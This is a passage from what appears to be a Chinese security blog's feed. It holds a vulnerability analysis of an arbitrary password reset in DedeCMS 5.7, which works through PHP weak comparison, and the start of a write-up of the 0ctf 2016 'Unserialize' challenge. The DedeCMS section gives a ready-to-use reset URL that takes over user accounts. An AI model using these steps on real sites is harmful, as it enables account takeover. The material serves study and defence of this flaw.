class="keyword">if</span>(<span class="keyword">empty</span>($safeanswer)) $safeanswer = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">'safequestion'</span>] == $safequestion &amp;&amp; $row[<span class="string">'safeanswer'</span>] == $safeanswer)</span><br><span class="line">    &#123;</span><br><span class="line">        sn($mid, $row[<span class="string">'userid'</span>], $row[<span class="string">'email'</span>], <span class="string">'N'</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">"对不起，您的安全问题或答案回答错误"</span>,<span class="string">"-1"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(<span class="variable">$row</span>[<span class="string">'safequestion'</span>] == <span class="variable">$safequestion</span> &amp;&amp; <span class="variable">$row</span>[<span class="string">'safeanswer'</span>] == <span class="variable">$safeanswer</span>)</span></span></span><br></pre></td></tr></table></figure><p>在该处使用了双等号进行判断，因此我们可以利用弱类型的特性进行绕过，默认注册用户是没有设置安全问题的，我们在数据库看一下默认的值</p><p><img src="/2019/08/06/DedeCms5-7任意用户密码重置分析/1.png" alt=""></p><p>safequestion的值为0，safeanswer值为空</p><p>对于上方的判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($safequestion)) $safequestion = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($safeanswer)) $safeanswer = <span class="string">''</span>;</span><br></pre></td></tr></table></figure><p>最后的safequestion值为0，safeanswer值为空，这样对于safequestion，我们可以使用0.0     0.这样的字符串使他们强制转换为int后变为0 达到绕过判断的目的，而对于safeanswer我们直接置空就好</p><p>绕过之后我们会进入sn()函数</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sn(<span class="symbol">$mi</span>d, <span class="symbol">$r</span>ow[<span class="string">'userid'</span>], <span class="symbol">$r</span>ow[<span class="string">'email'</span>], <span class="string">'N'</span>);</span><br></pre></td></tr></table></figure><p>定位函数，该函数在/member/inc/inc_pwd_functions.php中，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sn</span><span class="params">($mid,$userid,$mailto, $send = <span class="string">'Y'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $db;</span><br><span class="line">    $tptim= (<span class="number">60</span>*<span class="number">10</span>);</span><br><span class="line">    $dtime = time();</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'"</span>;</span><br><span class="line">    $row = $db-&gt;GetOne($sql);</span><br><span class="line">    <span class="keyword">if</span>(!is_array($row))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//发送新邮件；</span></span><br><span class="line">        newmail($mid,$userid,$mailto,<span class="string">'INSERT'</span>,$send);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//10分钟后可以再次发送新验证码；</span></span><br><span class="line">    <span class="keyword">elseif</span>($dtime - $tptim &gt; $row[<span class="string">'mailtime'</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        newmail($mid,$userid,$mailto,<span class="string">'UPDATE'</span>,$send);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//重新发送新的验证码确认邮件；</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ShowMsg(<span class="string">'对不起，请10分钟后再重新申请'</span>, <span class="string">'login.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先该函数会在#@__pwd_tmp表中查询是否存在临时密码，当我们第一次重置密码时，该表中是没有值的，而后通过下面的判断，我们自然的进入了newmail函数</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newmail($mid,$userid,$mailto,<span class="string">'INSERT'</span>,$send)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>该函数同样在/member/inc/inc_pwd_functions.php 中，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newmail</span><span class="params">($mid, $userid, $mailto, $type, $send)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $db,$cfg_adminemail,$cfg_webname,$cfg_basehost,$cfg_memberurl;</span><br><span class="line">    $mailtime = time();</span><br><span class="line">    $randval = random(<span class="number">8</span>);</span><br><span class="line">    $mailtitle = $cfg_webname.<span class="string">":密码修改"</span>;</span><br><span class="line">    $mailto = $mailto;</span><br><span class="line">    $headers = <span class="string">"From: "</span>.$cfg_adminemail.<span class="string">"\r\nReply-To: $cfg_adminemail"</span>;</span><br><span class="line">    $mailbody = <span class="string">"亲爱的"</span>.$userid.<span class="string">"：\r\n您好！感谢您使用"</span>.$cfg_webname.<span class="string">"网。\r\n"</span>.$cfg_webname.<span class="string">"应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\r\n本次临时登陆密码为："</span>.$randval.<span class="string">" 请于三天内登陆下面网址确认修改。\r\n"</span>.$cfg_basehost.$cfg_memberurl.<span class="string">"/resetpassword.php?dopost=getpasswd&amp;id="</span>.$mid;</span><br><span class="line">    <span class="keyword">if</span>($type == <span class="string">'INSERT'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $key = md5($randval);</span><br><span class="line">        $sql = <span class="string">"INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES ('$mid', '$userid',  '$key', '$mailtime');"</span>;</span><br><span class="line">        <span class="keyword">if</span>($db-&gt;ExecuteNoneQuery($sql))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($send == <span class="string">'Y'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                sendmail($mailto,$mailtitle,$mailbody,$headers);</span><br><span class="line">                <span class="keyword">return</span> ShowMsg(<span class="string">'EMAIL修改验证码已经发送到原来的邮箱请查收'</span>, <span class="string">'login.php'</span>,<span class="string">''</span>,<span class="string">'5000'</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($send == <span class="string">'N'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> ShowMsg(<span class="string">'稍后跳转到修改页'</span>, $cfg_basehost.$cfg_memberurl.<span class="string">"/resetpassword.php?dopost=getpasswd&amp;amp;id="</span>.$mid.<span class="string">"&amp;amp;key="</span>.$randval);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> ShowMsg(<span class="string">'对不起修改失败，请联系管理员'</span>, <span class="string">'login.php'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>($type == <span class="string">'UPDATE'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $key = md5($randval);</span><br><span class="line">        $sql = <span class="string">"UPDATE `#@__pwd_tmp` SET `pwd` = '$key',mailtime = '$mailtime'  WHERE `mid` ='$mid';"</span>;</span><br><span class="line">        <span class="keyword">if</span>($db-&gt;ExecuteNoneQuery($sql))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($send == <span class="string">'Y'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                sendmail($mailto,$mailtitle,$mailbody,$headers);</span><br><span class="line">                ShowMsg(<span class="string">'EMAIL修改验证码已经发送到原来的邮箱请查收'</span>, <span class="string">'login.php'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>($send == <span class="string">'N'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> ShowMsg(<span class="string">'稍后跳转到修改页'</span>, $cfg_basehost.$cfg_memberurl.<span class="string">"/resetpassword.php?dopost=getpasswd&amp;amp;id="</span>.$mid.<span class="string">"&amp;amp;key="</span>.$randval);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ShowMsg(<span class="string">'对不起修改失败，请与管理员联系'</span>, <span class="string">'login.php'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据前面的参数传递，最后会执行到这里</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> ShowMsg(<span class="string">'稍后跳转到修改页'</span>, $cfg_basehost.$cfg_memberurl.<span class="string">"/resetpassword.php?dopost=getpasswd&amp;amp;id="</span>.$mid.<span class="string">"&amp;amp;key="</span>.$randval)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>在这里$randval是我们所不知道的随机字符串，但是该行信息会进行回显输出，这也正是我们进行下一步密码重置操作所需要的链接</p><p>我们继续来看getpasswd的操作，代码位于 member\resetpassword.php，关键代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($dopost == <span class="string">"getpasswd"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//修改密码</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($id))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">"对不起，请不要非法提交"</span>,<span class="string">"login.php"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $mid = preg_replace(<span class="string">"#[^0-9]#"</span>, <span class="string">""</span>, $id);</span><br><span class="line">    $row = $db-&gt;GetOne(<span class="string">"SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'"</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($row))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">"对不起，请不要非法提交"</span>,<span class="string">"login.php"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($setp))</span><br><span class="line">    &#123;</span><br><span class="line">        $tptim= (<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">3</span>);</span><br><span class="line">        $dtime = time();</span><br><span class="line">        <span class="keyword">if</span>($dtime - $tptim &gt; $row[<span class="string">'mailtime'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            $db-&gt;executenonequery(<span class="string">"DELETE FROM `#@__pwd_tmp` WHERE `md` = '$id';"</span>);</span><br><span class="line">            ShowMsg(<span class="string">"对不起，临时密码修改期限已过期"</span>,<span class="string">"login.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/templets/resetpassword2.htm"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>($setp == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($key)) $pwdtmp = $key;</span><br><span class="line"></span><br><span class="line">        $sn = md5(trim($pwdtmp));</span><br><span class="line">        <span class="keyword">if</span>($row[<span class="string">'pwd'</span>] == $sn)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($pwd != <span class="string">""</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>($pwd == $pwdok)</span><br><span class="line">                &#123;</span><br><span class="line">                    $pwdok = md5($pwdok);</span><br><span class="line">                    $sql = <span class="string">"DELETE FROM `#@__pwd_tmp` WHERE `mid` = '$id';"</span>;</span><br><span class="line">                    $db-&gt;executenonequery($sql);</span><br><span class="line">                    $sql = <span class="string">"UPDATE `#@__member` SET `pwd` = '$pwdok' WHERE `mid` = '$id';"</span>;</span><br><span class="line">                    <span class="keyword">if</span>($db-&gt;executenonequery($sql))</span><br><span class="line">                    &#123;</span><br><span class="line">                        showmsg(<span class="string">'更改密码成功，请牢记新密码'</span>, <span class="string">'login.php'</span>);</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            showmsg(<span class="string">'对不起，新密码为空或填写不一致'</span>, <span class="string">'-1'</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        showmsg(<span class="string">'对不起，临时密码错误'</span>, <span class="string">'-1'</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次会执行到这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($setp))</span><br><span class="line">&#123;</span><br><span class="line">    $tptim= (<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">3</span>);</span><br><span class="line">    $dtime = time();</span><br><span class="line">    <span class="keyword">if</span>($dtime - $tptim &gt; $row[<span class="string">'mailtime'</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        $db-&gt;executenonequery(<span class="string">"DELETE FROM `#@__pwd_tmp` WHERE `md` = '$id';"</span>);</span><br><span class="line">        ShowMsg(<span class="string">"对不起，临时密码修改期限已过期"</span>,<span class="string">"login.php"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/templets/resetpassword2.htm"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该段代码最后请求了/templets/resetpassword2.htm 这个页面，我们来看一下</p><p><img src="/2019/08/06/DedeCms5-7任意用户密码重置分析/2.png" alt=""></p><p>页面将step的值修改为2后又回到上面那段代码，接着执行该段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($setp == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($key)) $pwdtmp = $key;</span><br><span class="line"></span><br><span class="line">        $sn = md5(trim($pwdtmp));</span><br><span class="line">        <span class="keyword">if</span>($row[<span class="string">'pwd'</span>] == $sn)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($pwd != <span class="string">""</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>($pwd == $pwdok)</span><br><span class="line">                &#123;</span><br><span class="line">                    $pwdok = md5($pwdok);</span><br><span class="line">                    $sql = <span class="string">"DELETE FROM `#@__pwd_tmp` WHERE `mid` = '$id';"</span>;</span><br><span class="line">                    $db-&gt;executenonequery($sql);</span><br><span class="line">                    $sql = <span class="string">"UPDATE `#@__member` SET `pwd` = '$pwdok' WHERE `mid` = '$id';"</span>;</span><br><span class="line">                    <span class="keyword">if</span>($db-&gt;executenonequery($sql))</span><br><span class="line">                    &#123;</span><br><span class="line">                        showmsg(<span class="string">'更改密码成功，请牢记新密码'</span>, <span class="string">'login.php'</span>);</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>该段进行了最后一步重置密码的操作</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>首先访问链接 <a href="http://127.0.0.1/dedecms/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=1" target="_blank" rel="noopener">http://127.0.0.1/dedecms/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=1</a></p><p>抓包repeater取回带有key的链接</p><p><img src="/2019/08/06/DedeCms5-7任意用户密码重置分析/3.png" alt=""></p><p>访问该链接，即可重置密码</p><p><img src="/2019/08/06/DedeCms5-7任意用户密码重置分析/4.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码分析&quot;&gt;&lt;a href=&quot;#代码分析&quot; class=&quot;headerlink&quot; title=&quot;代码分析&quot;&gt;&lt;/a&gt;代码分析&lt;/h1&gt;&lt;p&gt;漏洞利用点主要是php弱类型的判断缺陷，漏洞代码位于 member\resetpassword.php&lt;/p&gt;
&lt;p&gt;主要代
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="https://yml-sec.top/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>0ctf-2016-Unserialize题目分析</title>
    <link href="https://yml-sec.top/2019/07/16/0ctf-2016-Unserialize%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/"/>
    <id>https://yml-sec.top/2019/07/16/0ctf-2016-Unserialize%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/</id>
    <published>2019-07-16T12:41:01.000Z</published>
    <updated>2019-07-16T14:35:44.543Z</updated>
    
    <content type="html"><![CDATA[<p>题目有源码泄露，打开备份文件开始审计，注意到flag在config.php中</p><p>贴上部分需要分析的代码：</p><p>update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Login First'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">$file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Login First'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line"><span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先注册登录，然后有更新信息的功能</p><p><img src="/2019/07/16/0ctf-2016-Unserialize题目分析/1.png" alt=""></p><p>分析下upload.php中的代码</p><p><img src="/2019/07/16/0ctf-2016-Unserialize题目分析/2.png" alt=""></p><p>注意到该处正则表达式是有缺陷的，我们可以使用数组的方式来绕过该处的长度限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'die.&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'gone.&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_POST[<span class="string">'nickname'</span>]);</span><br></pre></td></tr></table></figure><p><img src="/2019/07/16/0ctf-2016-Unserialize题目分析/3.png" alt=""></p><p>然后继续看profile的源码，发现了读取文件的函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$photo = base64<span class="constructor">_encode(<span class="params">file_get_contents</span>($<span class="params">profile</span>['<span class="params">photo</span>'])</span>);</span><br></pre></td></tr></table></figure><p>这样我们可以反序列化控制$photo的值为config.php来获取flag</p><p>转回来我们看一下update.php中的序列化操作，代码抽取出来是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($_POST[<span class="string">'filename'</span>]);</span><br><span class="line"><span class="keyword">echo</span> serialize($profile);</span><br><span class="line"><span 